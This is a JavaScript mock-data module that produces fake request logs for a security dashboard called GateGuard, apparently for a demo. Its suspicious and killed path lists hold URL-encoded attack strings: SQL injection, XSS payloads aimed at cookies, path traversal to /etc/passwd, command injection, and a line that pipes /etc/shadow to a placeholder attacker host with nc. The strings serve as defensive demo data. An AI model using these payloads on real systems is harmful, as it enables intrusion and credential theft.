/**
 * GateGuard Mock Data Module
 * 
 * Future Contract Specification:
 * {
 *   timestamp: string, // ISO format timestamp
 *   ip: string,        // Source IP address
 *   path: string,      // Request URI / path with query params
 *   risk_score: number,// ML evaluation score (0 - 100)
 *   status: "clean" | "suspicious" | "killed", // Threat status
 *   token_hash: string // Session token identifier (truncated/hashed)
 * }
 */

// Realistic seed pools matching the login + search security demo backend
const BENIGN_PATHS = [
  "/login",
  "/search?q=incident+report",
  "/search?q=proxy+config",
  "/search?q=system+audit",
  "/search?q=user+credentials",
  "/search?q=database+migration",
  "/search?q=auth+policy",
  "/search?q=admin+guidelines",
  "/search?q=network+logs",
  "/search?q=security+compliance"
];

const SUSPICIOUS_PATHS = [
  "/search?q=SELECT+*+FROM+users",
  "/search?q=admin+OR+1%3D1",
  "/search?q=user%27+UNION+SELECT",
  "/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
  "/search?q=password+reset+bypass",
  "/search?q=api+secret+key",
  "/login" // repeated failed login attempt scenario
];

const KILLED_PATHS = [
  "/search?q=%27+OR+%271%27%3D%271%27+--",
  "/search?q=UNION+SELECT+1,2,username,password+FROM+accounts",
  "/search?q=%3Ciframe+src%3Djavascript%3Aalert%28document.cookie%29%3E",
  "/search?q=..%2F..%2F..%2Fetc%2Fpasswd",
  "/search?q=cmd.exe+%2Fc+dir+C%3A%5C",
  "/search?q=cat+%2Fetc%2Fshadow+%7C+nc+attacker.com",
  "/search?q=xp_cmdshell+%27whoami%27"
];

const MOCK_IPS = [
  "192.168.1.104",
  "10.0.4.82",
  "172.16.24.11",
  "45.33.21.90",
  "185.220.101.5",
  "198.51.100.42",
  "203.0.113.19",
  "142.250.190.46",
  "10.0.4.155",
  "192.168.1.210"
];

const MOCK_TOKENS = [
  "tok_8f2c6114a90d",
  "tok_c3f190e4a71b",
  "tok_e91a27b84f3c",
  "tok_7b049d12e85a",
  "tok_3a8f11c902b4",
  "tok_9d428e17f301",
  "tok_5c6b73d09a2e",
  "tok_1f8a94b5e093",
  "tok_b4e731c28f09",
  "tok_6d90a12e4f71"
];

function getRandomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

/**
 * Generates a single log entry adhering strictly to the GateGuard data contract.
 */
export function generateSingleLog(timestamp = null) {
  const timeStr = timestamp || new Date().toISOString();
  const rand = Math.random();

  let status, risk_score, path;

  if (rand < 0.65) {
    // 65% clean traffic
    status = "clean";
    risk_score = getRandomInt(0, 28);
    path = getRandomElement(BENIGN_PATHS);
  } else if (rand < 0.85) {
    // 20% suspicious traffic
    status = "suspicious";
    risk_score = getRandomInt(35, 68);
    path = getRandomElement(SUSPICIOUS_PATHS);
  } else {
    // 15% killed / high risk traffic
    status = "killed";
    risk_score = getRandomInt(75, 99);
    path = getRandomElement(KILLED_PATHS);
  }

  return {
    timestamp: timeStr,
    ip: getRandomElement(MOCK_IPS),
    path: path,
    risk_score: risk_score,
    status: status,
    token_hash: getRandomElement(MOCK_TOKENS)
  };
}

/**
 * Generates initial batch of 20 realistic log entries ordered from newest to oldest.
 */
export function generateInitialLogs(count = 20) {
  const logs = [];
  const now = Date.now();

  for (let i = 0; i < count; i++) {
    // Offset timestamps backward by 3 to 25 seconds per entry
    const pastTime = new Date(now - i * getRandomInt(3000, 25000)).toISOString();
    logs.push(generateSingleLog(pastTime));
  }

  return logs;
}
